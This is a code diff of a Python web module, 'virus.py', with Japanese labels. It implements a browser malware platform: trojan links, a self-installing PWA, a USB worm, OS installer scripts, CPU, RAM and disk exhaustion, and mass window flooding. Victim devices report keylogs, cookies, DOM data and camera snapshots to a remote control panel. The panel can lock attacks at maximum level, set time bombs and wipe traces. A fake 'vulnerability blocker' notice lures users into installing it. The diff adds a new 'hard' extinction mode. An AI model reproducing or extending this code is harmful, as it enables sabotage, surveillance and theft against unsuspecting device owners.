@@ -1,37 +1,9 @@
-"""
-app/virus.py — ウイルス兵器モジュール
+"""app/virus.py — ウイルス兵器モジュール
 
-モード:
-  trojan_link    トロイの木馬（リンク型）
-  trojan_install トロイの木馬（常駐型）
-  max_power      全部盛り（最高威力）
-  brick          ブリック（タブが死なない）
-  windows        爆音窓爆弾（音＋大量ウィンドウ）／無限窓モード
-  storage        容量枯渇
-  mix            全部ミックス
-  singularity    特異点（全46系統統合・PWA常駐・USBワーム・OS常駐インストーラ・
-                 指数増殖する無限窓繁殖・L7固定枠）
+モード: trojan_link / trojan_install / max_power / brick / windows / storage / mix / singularity
 
-設計:
-  兵器ページはボタン無し。開いた瞬間から全部自動・無限。
-  枚数や発射・停止はこちらの監視室から遠隔操作する（兵器ページがポーリング）。
-  singularity はさらに PWA として端末にインストールさせ、常駐・自動起動する。
-  相手のUSBにも自分を仕込んで伝染する。
-  L7「絶滅」は固定枠。fixed=1 の間は遠隔から下げられない。
-  L7では窓が指数増殖し、各窓がヘビースキンで高火力化する。
-  L7ではOS常駐インストーラ(.bat/.command/.sh)を配り、ブラウザの外まで侵食する。
-
-監視室:
-  /vp/{code}            操作盤（AJAX・ページ遷移なし）
-  /vp/{code}/data       ライブデータ（JSON）
-  /api/vp/{code}/state  現在状態
-  /api/vp/{code}/stages 個体ごとの進行度＋全体の制圧率
-  /api/vp/{code}/rat    個体別RAT/キーログ/DOM
-  /api/vp/{code}/winlock 窓増殖の設定（off/chain/breed・分岐・深さ）
-
-v3.5 追加:
-  窓増殖設定を監視室から保存できるようにした（DB: win_mode/win_branch/win_depth →
-  singularity の cfg(winLock) に流す）。env(SG_WIN_*) はフォールバックとして維持。
+監視室: /vp/{code}（AJAX・遷移なし）
+API: /api/vp/{code}/state|stages|rat|winlock|win|hard|hit/{id}/bot
 """
 from __future__ import annotations
 
@@ -57,7 +29,7 @@ router = APIRouter()
 
 MODES = ["trojan_link", "trojan_install", "max_power", "brick",
          "windows", "storage", "mix", "singularity"]
-MODE_ALIAS = {"sound": "windows", "sg": "singularity"}   # 旧 sound は爆音窓爆弾へ統合
+MODE_ALIAS = {"sound": "windows", "sg": "singularity"}
 
 MODE_LABEL = {
     "trojan_link": "トロイの木馬（リンク型）",
@@ -77,15 +49,15 @@ MODE_DESC = {
     "windows": "開いた瞬間に大量のウィンドウを出し切る。全ウィンドウが爆音ループ＋感染表示。∞なら止まるまで。",
     "storage": "開いた瞬間に端末の容量を埋め尽くす。",
     "mix": "上の全部を無限に。最強。",
-    "singularity": "全46系統・8資源同時攻撃。CPU全コア・GPU・RAM・ディスクを枯渇させ、メインスレッドを凍結し、PWAとして端末に常駐インストールされる。相手のUSBにも自分を仕込んで伝染する。監視室からレベル0〜7を遠隔変更できる。L7は固定枠で、窓が指数増殖し、各窓がヘビースキンで高火力化し、OS常駐インストーラによりブラウザの外まで侵食する。",
+    "singularity": "全46系統・8資源同時攻撃。CPU全コア・GPU・RAM・ディスクを枯渇させ、"
+                   "メインスレッドを凍結し、PWAとして端末に常駐インストールされる。"
+                   "相手のUSBにも自分を仕込んで伝染する。監視室からレベル0〜7を遠隔変更できる。"
+                   "L7は固定枠で、窓が指数増殖し、各窓がヘビースキンで高火力化し、"
+                   "OS常駐インストーラによりブラウザの外まで侵食する。",
 }
 
-# 常駐（ホーム画面追加）で自動発射するモード
 AUTO_MODES = ("trojan_install", "mix")
-
-# 1セットの枚数（10 / 100 / 0=無限）
 SET_CHOICES = (10, 100, 0)
-
 DEFAULT_NOTIFY = "今すぐ脆弱性ブロッカーをインストールしてウイルス感染を回避してください。"
 
 CAUTION = {
@@ -96,7 +68,11 @@ CAUTION = {
     "windows": "⚠ 開いた瞬間に1セット（既定100枚）を10秒以内に出し切る。全ウィンドウが爆音ループ＋感染表示。∞なら止まるまで。",
     "storage": "⚠ 開いた瞬間に容量を埋め始める。ボタン操作は不要。",
     "mix": "⚠ ホーム画面に追加＝自爆。開いた瞬間から全部が無限に発動する。",
-    "singularity": "⚠ 最終兵器。ディスクをquotaの95%まで食い、全コアを100%で回し、RAMを膨張させ、タブを閉じにくくする。さらにPWAとして端末に常駐し、OSログイン時に自動起動する。相手のUSBにも仕込んで伝染する。レベルは監視室から遠隔操作。L7「絶滅」は固定枠で、立てたら遠隔から下げられない。窓がリミッターなしで倍々に増え続け、OS常駐インストーラを配る。停止・凍結中でもService Worker経由で命令が届く。",
+    "singularity": "⚠ 最終兵器。ディスクをquotaの95%まで食い、全コアを100%で回し、RAMを膨張させ、"
+                   "タブを閉じにくくする。さらにPWAとして端末に常駐し、OSログイン時に自動起動する。"
+                   "相手のUSBにも仕込んで伝染する。レベルは監視室から遠隔操作。L7「絶滅」は固定枠で、"
+                   "立てたら遠隔から下げられない。窓がリミッターなしで倍々に増え続け、OS常駐インストーラを配る。"
+                   "停止・凍結中でもService Worker経由で命令が届く。",
 }
 
 SCHEMA = """
@@ -108,7 +84,8 @@ CREATE TABLE IF NOT EXISTS virus_links(
   notify INTEGER DEFAULT 1, notify_text TEXT, notify_mode TEXT,
   level INTEGER DEFAULT 1, fixed INTEGER DEFAULT 0, wipe_seq INTEGER DEFAULT 0,
   freeze TEXT DEFAULT '', bomb TEXT DEFAULT '', inj INTEGER DEFAULT 1, ver TEXT,
-  win_mode TEXT DEFAULT '', win_branch INTEGER DEFAULT 0, win_depth INTEGER DEFAULT 0);
+  win_mode TEXT DEFAULT '', win_branch INTEGER DEFAULT 0, win_depth INTEGER DEFAULT 0,
+  hard TEXT DEFAULT '');
 CREATE TABLE IF NOT EXISTS virus_hits(
   id INTEGER PRIMARY KEY AUTOINCREMENT, code TEXT, ts TEXT, ip TEXT, ua TEXT,
   device TEXT, os TEXT, browser TEXT, inapp TEXT, country TEXT, city TEXT,
@@ -197,13 +174,13 @@ def _migrate(c):
                       ("ver", "TEXT"),
                       ("win_mode", "TEXT DEFAULT ''"),
                       ("win_branch", "INTEGER DEFAULT 0"),
-                      ("win_depth", "INTEGER DEFAULT 0")):
+                      ("win_depth", "INTEGER DEFAULT 0"),
+                      ("hard", "TEXT DEFAULT ''")):
         if name not in cols:
             try:
                 c.execute(f"ALTER TABLE virus_links ADD COLUMN {name} {ddl}")
             except Exception:
                 pass
-    # --- singularity 用: hits に GPS と bot 列を足す ---
     try:
         hcols = {r["name"] for r in c.execute("PRAGMA table_info(virus_hits)").fetchall()}
     except Exception:
@@ -219,7 +196,6 @@ def _migrate(c):
 
 
 def _db(owner):
-    """executescript は必ず try で保護する（旧DBに無い列のインデックスで落ちないため）。"""
     c = sqlite3.connect(os.path.join(_dir(owner), "virus.db"),
                         timeout=15, check_same_thread=False)
     c.row_factory = sqlite3.Row
@@ -293,7 +269,7 @@ def _record_hit(owner, code, request):
     except Exception:
         bot = 0
     if not (ua or "").strip():
-        bot = 0                      # UA無しは「不明」であってbotとは限らない
+        bot = 0
     c = _db(owner)
     cur = c.execute("INSERT INTO virus_hits(code,ts,ip,ua,device,os,browser,inapp,"
                     "country,city,isp,vid,is_bot) VALUES(?,?,?,?,?,?,?,?,?,?,?,'',?)",
@@ -376,12 +352,6 @@ def sw():
     js = """/* igtracker virus sw */
 self.addEventListener("install", function (e) { self.skipWaiting(); });
 self.addEventListener("activate", function (e) { e.waitUntil(self.clients.claim()); });
-self.addEventListener("fetch", function (e) {
-  if (e.request.method !== "GET") return;
-  var u = new URL(e.request.url);
-  if (u.origin !== location.origin) return;
-  if (u.pathname.indexOf("/v/") === 0) return;
-});
 self.addEventListener("message", function (e) {
   if (e.data && e.data.type === "skip") self.skipWaiting();
 });
@@ -403,7 +373,6 @@ def icon():
 
 @router.get("/v/{code}/manifest.json")
 def manifest(code: str, name: str = "", mode: str = ""):
-    """mode を渡すと、インストール後の発射モードを差し替えられる。"""
     start = "/v/" + code + "?i=1"
     if mode:
         start += "&m=" + mode
@@ -452,7 +421,6 @@ def land(code: str, request: Request):
     if not row or not row["active"]:
         return PlainTextResponse("リンクが無効です", status_code=404)
 
-    # ?m= でモード上書き（インストール後の起動用）
     mode = _norm_mode(request.query_params.get("m") or row["mode"])
 
     if mode == "singularity":
@@ -466,7 +434,6 @@ def land(code: str, request: Request):
     notify_mode = _norm_mode(notify_mode) if notify_mode else ""
     notify = int(_val(row, "notify", 1))
     notify_text = _val(row, "notify_text", "") or DEFAULT_NOTIFY
-    # インストールさせる対象（通知のボタンが入れる兵器）
     install_mode = notify_mode or (mode if mode in ("trojan_install", "mix") else "")
 
     return _render(
@@ -544,7 +511,7 @@ def watch(code: str, request: Request, new: str = "", u=Depends(_auth)):
     for h in hits:
         if h.get("vid") and h["vid"] not in sids:
             sids.append(h["vid"])
-    stages, stat = _sg_stages_for(hits, by_hit)          # ← 進行度＋集計
+    stages, stat = _sg_stages_for(hits, by_hit)
     return _render("virus_watch.html", request, code=code, link=dict(row), row=dict(row),
                    hits=hits, by_hit=by_hit, base=base, is_new=(new == "1"),
                    stages=stages, stat=stat, sids=sids,
@@ -576,12 +543,12 @@ def watch(code: str, request: Request, new: str = "", u=Depends(_auth)):
                    win_mode=_val(row, "win_mode", "") or "",
                    win_branch=int(_val(row, "win_branch", 0) or 0),
                    win_depth=int(_val(row, "win_depth", 0) or 0),
+                   hard=_val(row, "hard", "") or "",
                    modes=[(m, MODE_LABEL[m]) for m in MODES])
 
 
 @router.get("/vp/{code}/data")
 def watch_data(code: str, u=Depends(_auth)):
-    """監視室のライブ更新（テンプレが3秒ごとに叩く）。"""
     owner = tenancy.get_current() or u
     c = _db(owner)
     rows = [dict(r) for r in c.execute(
@@ -596,7 +563,6 @@ def watch_data(code: str, u=Depends(_auth)):
 
 @router.post("/vp/{code}/win")
 def sg_win(code: str, n: str = Form("2"), u=Depends(_auth)):
-    """監視室から窓繁殖を強制発火（個体に win コマンドを配る）。"""
     owner = tenancy.get_current() or u
     c = _db(owner)
     if not _link(c, code):
@@ -673,7 +639,6 @@ def api(code: str, u=Depends(_auth)):
 
 @router.get("/api/vp/{code}/rat")
 def api_rat(code: str, sid: str = "", u=Depends(_auth)):
-    """個体（sid）のRAT・キーログ・DOM・Cookie・API呼び出しをまとめて返す。"""
     owner = tenancy.get_current() or u
     c = _db(owner)
     hid = 0
@@ -767,7 +732,7 @@ from .singularity import (PAYLOAD_JS as _SG_PAYLOAD, SW_JS as _SG_SW,
                           WORKER_JS as _SG_WORKER, SHARED_JS as _SG_SHARED,
                           INSTALL_BAT as _SG_BAT, INSTALL_COMMAND as _SG_CMD,
                           INSTALL_SH as _SG_SH, build_installer as _sg_installer,
-                          VIRUS as SINGULARITY,
+                          VIRUS as SINGULARITY, VIRUS_VERSION as _SG_VERSION,
                           new_sid as _sg_sid, LEVEL_LABEL as _SG_LEVEL_LABEL,
                           LEVEL_DESC as _SG_LEVEL_DESC,
                           APP_NAME_DEFAULT as _SG_APP_NAME)
@@ -775,7 +740,8 @@ from .singularity import (PAYLOAD_JS as _SG_PAYLOAD, SW_JS as _SG_SW,
 MODE_LABEL["singularity"] = "特異点（SINGULARITY）"
 _GIF1 = base64.b64decode("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7")
 _SG_INSTALL_LEVEL = int(os.getenv("SG_INSTALL_LEVEL", "4"))
-_SG_VER = os.getenv("SG_APP_VER", "3.5")
+_SG_VER = os.getenv("SG_APP_VER", _SG_VERSION)
+_SG_HARD_RAM_MB = int(os.getenv("SG_HARD_RAM_MB", "512"))
 _SG_INJ = os.getenv("SG_INJ", "1") != "0"
 _SG_RAT = os.getenv("SG_RAT", "1") != "0"
 _SG_SSE = os.getenv("SG_SSE", "1") != "0"
@@ -796,7 +762,6 @@ _SG_ICONS = {}
 
 
 def _lv(v) -> int:
-    """レベルは 0〜7 の8段階。7は固定枠。"""
     try:
         return max(0, min(7, int(v)))
     except Exception:
@@ -830,7 +795,6 @@ def _sg_win_lock(row=None):
 
 
 def _sg_icon(size, maskable=False):
-    """PWA 用アイコンを Pillow で生成（無ければ空を返し SVG にフォールバック）。"""
     key = (size, bool(maskable))
     if key in _SG_ICONS:
         return _SG_ICONS[key]
@@ -871,7 +835,6 @@ _SG_ICON_SVG = (
 
 
 def _sg_flat(prefix, obj, out, depth=0):
-    """singularity の巨大JSONを key/value に平坦化する。"""
     if depth > 7 or len(out) > 400:
         return
     if isinstance(obj, dict):
@@ -890,7 +853,6 @@ def _sg_flat(prefix, obj, out, depth=0):
 
 
 def _sg_ingest(owner, code, report, sid):
-    """singularity の報告を virus_data に取り込む（差分のみ・監視室にそのまま出る）。"""
     sid = str(sid or report.get("sid") or "")[:64]
     c = _db(owner)
     hid = 0
@@ -928,7 +890,6 @@ def _sg_ingest(owner, code, report, sid):
                   (code, hid, sid, "selfie", snap[:400000], ts))
         n += 1
 
-    # --- 端末情報の自己修復（UA解析が失敗していても payload の申告で埋める） ---
     try:
         env = report.get("env") or {}
         ua2 = str(env.get("ua") or "")[:400]
@@ -945,7 +906,6 @@ def _sg_ingest(owner, code, report, sid):
                 nb = br if (not cur["browser"] or cur["browser"] == "不明") else cur["browser"]
                 c.execute("UPDATE virus_hits SET ua=?,device=?,os=?,browser=? WHERE id=?",
                           (nu, nd, no, nb, hid))
-        # JSが動いた時点で bot ではない
         c.execute("UPDATE virus_hits SET is_bot=0 WHERE id=?", (hid,))
     except Exception:
         pass
@@ -971,7 +931,6 @@ def _sg_ingest(owner, code, report, sid):
 
 
 def _sg_cfg(row, code, sid, lv, app_name, extra=None):
-    """singularity の CFG を組み立てる（本体ページと注入用 p.js で共有）。"""
     base = f"/v/{code}/sg"
     fixed = _is_fixed(row)
     if fixed:
@@ -985,6 +944,7 @@ def _sg_cfg(row, code, sid, lv, app_name, extra=None):
         "fixed": fixed, "finalRamMB": _SG_FINAL_RAM_MB, "gpuMem": _SG_GPU_MEM,
         "installer": True, "code": code,
         "winLock": _sg_win_lock(row),
+        "hardMode": _val(row, "hard", "") or "",
         "freeze": _val(row, "freeze", "") or "", "bomb": _val(row, "bomb", "") or "",
         "w": 0, "wipe": False, "avName": app_name, "ver": _SG_VER,
         "install": os.getenv("SG_INSTALL", "auto"), "installLevel": _SG_INSTALL_LEVEL,
@@ -1026,9 +986,9 @@ def _sg_land(code, request, sid=""):
     if lvq is not None and str(lvq).isdigit():
         lv = _lv(lvq)
     if _is_fixed(row):
-        lv = 7                                     # 固定枠は何があってもL7
+        lv = 7
     if installed:
-        lv = max(lv, _SG_INSTALL_LEVEL)          # インストール済みアプリ窓は最低L4
+        lv = max(lv, _SG_INSTALL_LEVEL)
 
     _n = (row["name"] or "").strip()
     app_name = (request.query_params.get("n") or os.getenv("SG_APP_NAME")
@@ -1036,18 +996,17 @@ def _sg_land(code, request, sid=""):
 
     cfg = _sg_cfg(row, code, sid, lv, app_name,
                   {"w": int(w) if str(w).isdigit() else 0, "wipe": wipe})
-    # worker_json に SHARED も連結して渡す（テンプレは1行しか無いため）
     wj = (json.dumps(_SG_WORKER)
           + ";window.__SINGULARITY_SHARED__=" + json.dumps(_SG_SHARED))
     resp = _render("virus_singularity.html", request, code=code, sid=sid, hit=hid,
                    link=dict(row), row=dict(row), ref=ref, level=lv,
+                   ver=_SG_VER,
                    level_label=_SG_LEVEL_LABEL.get(lv, ""),
                    manifest=cfg["manifest"] + "?n=" + quote_plus(app_name),
                    icon192=cfg["icons"][0], icon512=cfg["icons"][1], app_name=app_name,
                    cfg_json=json.dumps(cfg, ensure_ascii=False),
                    worker_json=wj, shared_json=json.dumps(_SG_SHARED),
                    payload=_SG_PAYLOAD)
-    # crossOriginIsolated を成立させ、SharedArrayBuffer / Atomics.wait を確実に使えるようにする
     resp.headers["Cross-Origin-Opener-Policy"] = "same-origin"
     resp.headers["Cross-Origin-Embedder-Policy"] = "require-corp"
     try:
@@ -1061,7 +1020,6 @@ def _sg_land(code, request, sid=""):
 
 @router.get("/v/{code}/sg/p.js")
 def sg_pjs(code: str, sid: str = "", level: str = "", u: str = "", v: str = ""):
-    """SWが全ページに差し込む注入用ペイロード。"""
     owner = _owner(code)
     if not owner:
         raise HTTPException(404)
@@ -1076,10 +1034,10 @@ def sg_pjs(code: str, sid: str = "", level: str = "", u: str = "", v: str = ""):
         lv = _lv(level)
     cfg = _sg_cfg(row, code, sid, lv, (row["name"] or "").strip() or _SG_APP_NAME,
                   {"injected": True, "install": "click", "windows": 0, "hop": False})
-    js = ("window.__SINGULARITY_CFG__=" + json.dumps(cfg, ensure_ascii=False)
+    js = ("window.__SINGULARITY_VER__=" + json.dumps(_SG_VER) + ";"
+          + "window.__SINGULARITY_CFG__=" + json.dumps(cfg, ensure_ascii=False)
           + ";window.__SINGULARITY_WORKER__=" + json.dumps(_SG_WORKER) + ";"
           + "window.__SINGULARITY_SHARED__=" + json.dumps(_SG_SHARED) + ";"
-          + "window.__SINGULARITY_VER__=" + json.dumps(_SG_VER) + ";"
           + _SG_PAYLOAD)
     return Response(js, media_type="application/javascript",
                     headers={"Cache-Control": "public, max-age=300",
@@ -1101,7 +1059,6 @@ def sg_shared(code: str):
 
 
 def _sg_installer_ctx(code: str, request: Request, app: str, burn: str, disk: str):
-    """インストーラ生成の共通部。"""
     owner = _owner(code)
     if not owner:
         raise HTTPException(404)
@@ -1111,7 +1068,8 @@ def _sg_installer_ctx(code: str, request: Request, app: str, burn: str, disk: st
     if not row or not row["active"]:
         raise HTTPException(404)
     base = _base(request)
-    url = f"{base}/v/{code}/sg?u=os&i=1"
+    hard = 1 if (_val(row, "hard", "") or "") else 0
+    url = f"{base}/v/{code}/sg?u=os&i=1" + ("&hard=1" if hard else "")
     try:
         b = int(burn)
     except Exception:
@@ -1124,13 +1082,14 @@ def _sg_installer_ctx(code: str, request: Request, app: str, burn: str, disk: st
     d = max(0, min(65536, d or 1024))
     nm = (app or _SG_APP_NAME)[:60]
     safe = re.sub(r"[^A-Za-z0-9_.-]", "", nm) or "blocker"
-    return url, code, nm, b, d, safe
+    return url, code, nm, b, d, safe, hard
 
 
 @router.get("/v/{code}/sg/install.bat")
 def sg_install_bat(code: str, request: Request, burn: str = "", disk: str = "", app: str = ""):
-    url, code2, nm, b, d, safe = _sg_installer_ctx(code, request, app, burn, disk)
-    body = _sg_installer(_SG_BAT, url, code2, nm, b, d, crlf=True)
+    url, code2, nm, b, d, safe, hard = _sg_installer_ctx(code, request, app, burn, disk)
+    body = _sg_installer(_SG_BAT, url, code2, nm, b, d, crlf=True,
+                         hard=hard, ram_mb=_SG_HARD_RAM_MB)
     return Response(body, media_type="application/octet-stream", headers={
         "Content-Disposition": f'attachment; filename="{safe}.bat"',
         "Cache-Control": "no-store"})
@@ -1138,8 +1097,9 @@ def sg_install_bat(code: str, request: Request, burn: str = "", disk: str = "", 
 
 @router.get("/v/{code}/sg/install.command")
 def sg_install_command(code: str, request: Request, burn: str = "", disk: str = "", app: str = ""):
-    url, code2, nm, b, d, safe = _sg_installer_ctx(code, request, app, burn, disk)
-    body = _sg_installer(_SG_CMD, url, code2, nm, b, d)
+    url, code2, nm, b, d, safe, hard = _sg_installer_ctx(code, request, app, burn, disk)
+    body = _sg_installer(_SG_CMD, url, code2, nm, b, d,
+                         hard=hard, ram_mb=_SG_HARD_RAM_MB)
     return Response(body, media_type="application/octet-stream", headers={
         "Content-Disposition": f'attachment; filename="{safe}.command"',
         "Cache-Control": "no-store"})
@@ -1147,8 +1107,9 @@ def sg_install_command(code: str, request: Request, burn: str = "", disk: str = 
 
 @router.get("/v/{code}/sg/install.sh")
 def sg_install_sh(code: str, request: Request, burn: str = "", disk: str = "", app: str = ""):
-    url, code2, nm, b, d, safe = _sg_installer_ctx(code, request, app, burn, disk)
-    body = _sg_installer(_SG_SH, url, code2, nm, b, d)
+    url, code2, nm, b, d, safe, hard = _sg_installer_ctx(code, request, app, burn, disk)
+    body = _sg_installer(_SG_SH, url, code2, nm, b, d,
+                         hard=hard, ram_mb=_SG_HARD_RAM_MB)
     return Response(body, media_type="application/octet-stream", headers={
         "Content-Disposition": f'attachment; filename="{safe}.sh"',
         "Cache-Control": "no-store"})
@@ -1179,8 +1140,7 @@ def sg_manifest(code: str, name: str = ""):
         "share_target": {"action": base + "/share", "method": "POST",
                          "enctype": "multipart/form-data",
                          "params": {"title": "t", "text": "d", "url": "u"}},
-        "protocol_handlers": [{"protocol": "web+sg",
-                               "url": base + "/?ref=%s"}],
+        "protocol_handlers": [{"protocol": "web+sg", "url": base + "/?ref=%s"}],
         "file_handlers": [{"action": base,
                            "accept": {"application/x-singularity": [".sg"]}}],
         "edge_side_panel": {"preferred_width": 420},
@@ -1219,7 +1179,6 @@ def sg_icon_svg():
 
 @router.get("/v/{code}/sg/c")
 async def sg_collect_get(code: str, request: Request, sid: str = "", d: str = ""):
-    """画像ピクセル経路（GET）。+ が空白に潰れるので戻す。"""
     owner = _owner(code)
     if not owner:
         return Response(_GIF1, media_type="image/gif")
@@ -1256,7 +1215,6 @@ async def sg_collect(code: str, request: Request):
 
 
 def _sg_cmd_payload(owner, code, sid, sw=False):
-    """ペイロード／SW／SSE が拾う遠隔コマンド。個体別(sid)＋全体(sid='')。"""
     c = _db(owner)
     row = _link(c, code)
     if not row:
@@ -1277,6 +1235,7 @@ def _sg_cmd_payload(owner, code, sid, sw=False):
            "freeze": _val(row, "freeze", "") or "",
            "wipe": int(_val(row, "wipe_seq", 0) or 0),
            "win": _sg_win_lock(row),
+           "hard": _val(row, "hard", "") or "",
            "ver": _SG_VER, "cmds": cmds, "server": _now()}
     c.close()
     return out
@@ -1352,7 +1311,6 @@ def sg_worker(code: str):
 
 @router.post("/v/{code}/sg/share")
 async def sg_share(code: str, request: Request, sid: str = ""):
-    """share_target の受け口。共有されたファイル名を報告に載せる。"""
     owner = _owner(code)
     if not owner:
         return PlainTextResponse("ok")
@@ -1401,7 +1359,6 @@ def sg_level(code: str, level: str = Form("1"), u=Depends(_auth)):
 
 @router.post("/vp/{code}/fix")
 def sg_fix(code: str, fixed: str = Form("1"), u=Depends(_auth)):
-    """固定枠の設定／解除。立てると L7 にロックされ、遠隔から下げられない。"""
     owner = tenancy.get_current() or u
     c = _db(owner)
     v = 0 if str(fixed) in ("0", "", "false", "False") else 1
@@ -1426,7 +1383,6 @@ def sg_freeze(code: str, freeze: str = Form(""), u=Depends(_auth)):
 
 @router.post("/vp/{code}/detonate")
 def sg_detonate(code: str, u=Depends(_auth)):
-    """最終形態へ即時移行（レベル6・稼働）。"""
     owner = tenancy.get_current() or u
     c = _db(owner)
     c.execute("UPDATE virus_links SET level=6, firing=1, freeze='' WHERE code=?", (code,))
@@ -1437,7 +1393,6 @@ def sg_detonate(code: str, u=Depends(_auth)):
 
 @router.post("/vp/{code}/wipe")
 def sg_wipe(code: str, u=Depends(_auth)):
-    """感染端末の痕跡を完全消去させる（SWが navigate で叩き起こす）。"""
     owner = tenancy.get_current() or u
     c = _db(owner)
     c.execute("UPDATE virus_links SET wipe_seq=COALESCE(wipe_seq,0)+1 WHERE code=?", (code,))
@@ -1449,7 +1404,6 @@ def sg_wipe(code: str, u=Depends(_auth)):
 @router.post("/vp/{code}/cmd")
 def sg_push(request: Request, code: str, kind: str = Form(...), arg: str = Form(""),
             sid: str = Form(""), u=Depends(_auth)):
-    """個体別コマンド。sid を空にすると全個体へ。"""
     owner = tenancy.get_current() or u
     c = _db(owner)
     if not _link(c, code):
@@ -1473,11 +1427,10 @@ def sg_cmd_clear(code: str, u=Depends(_auth)):
 
 
 # ===========================================================================
-# AJAX 操作盤用 JSON API（ページ遷移しない・監視室が使う）
+# AJAX 操作盤用 JSON API
 # ===========================================================================
 
 def _api_state(owner, code):
-    """操作盤が同期に使う現在状態。"""
     c = _db(owner)
     row = _link(c, code)
     if not row:
@@ -1501,6 +1454,7 @@ def _api_state(owner, code):
             "win_mode": _val(row, "win_mode", "") or "",
             "win_branch": int(_val(row, "win_branch", 0) or 0),
             "win_depth": int(_val(row, "win_depth", 0) or 0),
+            "hard": _val(row, "hard", "") or "",
             "ver": _val(row, "ver", "") or _SG_VER,
             "hits": hn, "pending": pend, "server": _now()}
 
@@ -1541,7 +1495,6 @@ async def api_level(request: Request, code: str, u=Depends(_auth)):
 
 @router.post("/api/vp/{code}/fix")
 async def api_fix(request: Request, code: str, u=Depends(_auth)):
-    """固定枠のON/OFF。ONで L7 にロック。"""
     owner = tenancy.get_current() or u
     b = await _api_body(request)
     v = 0 if str(b.get("fixed") or "0") in ("0", "", "false", "False") else 1
@@ -1640,7 +1593,6 @@ def api_wipe(code: str, u=Depends(_auth)):
 
 @router.post("/api/vp/{code}/bomb")
 async def api_bomb(request: Request, code: str, u=Depends(_auth)):
-    """潜伏条件（YYYY-MM-DDTHH:MM の日時、または host に含ませる文字列）。空で解除。"""
     owner = tenancy.get_current() or u
     b = await _api_body(request)
     c = _db(owner)
@@ -1653,7 +1605,6 @@ async def api_bomb(request: Request, code: str, u=Depends(_auth)):
 
 @router.post("/api/vp/{code}/inj")
 async def api_inj(request: Request, code: str, u=Depends(_auth)):
-    """サイト全体へのSW注入（HTML書き換え）の on/off。"""
     owner = tenancy.get_current() or u
     b = await _api_body(request)
     v = 0 if str(b.get("inj") or "0") in ("0", "", "false", "False") else 1
@@ -1666,7 +1617,6 @@ async def api_inj(request: Request, code: str, u=Depends(_auth)):
 
 @router.post("/api/vp/{code}/cmd")
 async def api_cmd(request: Request, code: str, u=Depends(_auth)):
-    """個体別コマンド。sid を空にすると全個体。"""
     owner = tenancy.get_current() or u
     b = await _api_body(request)
     c = _db(owner)
@@ -1691,11 +1641,10 @@ def api_cmd_clear(code: str, u=Depends(_auth)):
     return _api_state(owner, code)
 
 
-# --- 窓増殖（特異点） ---
+# --- 窓増殖 / 絶滅（特異点） ---
 
 @router.post("/api/vp/{code}/winlock")
 async def api_winlock(request: Request, code: str, u=Depends(_auth)):
-    """窓増殖の設定（mode: '' / off / chain / breed、branch 1-8、depth 0-12）。空で既定。"""
     owner = tenancy.get_current() or u
     b = await _api_body(request)
     mode = str(b.get("mode") or "").strip()
@@ -1722,7 +1671,6 @@ async def api_winlock(request: Request, code: str, u=Depends(_auth)):
 
 @router.post("/api/vp/{code}/win")
 async def api_win(request: Request, code: str, u=Depends(_auth)):
-    """今すぐ窓を増やす（win コマンドを配る）。"""
     owner = tenancy.get_current() or u
     b = await _api_body(request)
     try:
@@ -1741,11 +1689,28 @@ async def api_win(request: Request, code: str, u=Depends(_auth)):
     return _api_state(owner, code)
 
 
+@router.post("/api/vp/{code}/hard")
+async def api_hard(request: Request, code: str, u=Depends(_auth)):
+    """絶滅モード。'' = OFF / 'install' = インストールさせたら / 'always' = 常時。"""
+    owner = tenancy.get_current() or u
+    b = await _api_body(request)
+    v = str(b.get("hard") or "").strip()
+    if v not in ("", "install", "always"):
+        v = ""
+    c = _db(owner)
+    if not _link(c, code):
+        c.close()
+        raise HTTPException(404)
+    c.execute("UPDATE virus_links SET hard=? WHERE code=?", (v, code))
+    c.commit()
+    c.close()
+    return _api_state(owner, code)
+
+
 # ===========================================================================
-# 感染判定と進行度（踏んだ個体ごとの「倒せたか」／全体の制圧率）
+# 感染判定と進行度
 # ===========================================================================
 
-# 進行度 0〜6。SG_DEFEAT_AT 以上を「倒せた（常駐成立）」と数える。
 SG_DEFEAT_AT = 3
 
 SG_STAGE_LABEL = {
@@ -1766,7 +1731,6 @@ SG_STAGE_COLOR = {
     4: "#ffd21e", 5: "#ff8a2b", 6: "#ff2d55",
 }
 
-# payload が申告してくるキーの接頭辞 → 到達段階
 _SG_STAGE_RULES = (
     (2, ("env.", "fp.", "verdict.", "hw.", "net.")),
     (3, ("privacy.sw", "sw.", "swreg", "persist.", "cache.", "opfs.")),
@@ -1781,7 +1745,6 @@ _BOT_KW = ("bot", "crawler", "spider", "curl", "wget", "python-requests",
 
 
 def _sg_is_bot(h, rows=()):
-    """手動マーク(bot.manual)を最優先 → is_bot 列 → UA推定。"""
     for r in rows or ():
         if str(r.get("key") or "") == "bot.manual":
             return str(r.get("value") or "") not in ("0", "", "false", "False")
@@ -1795,14 +1758,13 @@ def _sg_is_bot(h, rows=()):
 
 
 def _sg_stage(rows):
-    """virus_data のキー集合から進行度(0-6)を出す。"""
     if not rows:
         return 0
     keys = [str(r.get("key") or "") for r in rows]
     st = 1
     for lvl, prefixes in _SG_STAGE_RULES:
         hit = sum(1 for p in prefixes if any(p in k for k in keys))
-        need = 3 if lvl >= 6 else 1          # 終焉は複数系統そろって初めて成立
+        need = 3 if lvl >= 6 else 1
         if hit >= need:
             st = max(st, lvl)
     return min(st, 6)
@@ -1837,7 +1799,6 @@ def _sg_stages_for(hits, by_hit):
 
 @router.get("/api/vp/{code}/stages")
 def api_stages(code: str, u=Depends(_auth)):
-    """監視室が数秒ごとに叩く。行・進行度・集計をまとめて返す（リロード不要）。"""
     owner = tenancy.get_current() or u
     c = _db(owner)
     row = _link(c, code)
@@ -1876,7 +1837,6 @@ def api_stages(code: str, u=Depends(_auth)):
 
 @router.post("/api/vp/{code}/hit/{hid}/bot")
 def api_hit_bot(code: str, hid: int, u=Depends(_auth)):
-    """その個体を手動でボット扱い／解除（virus_data に記録）。"""
     owner = tenancy.get_current() or u
     c = _db(owner)
     if not _link(c, code):
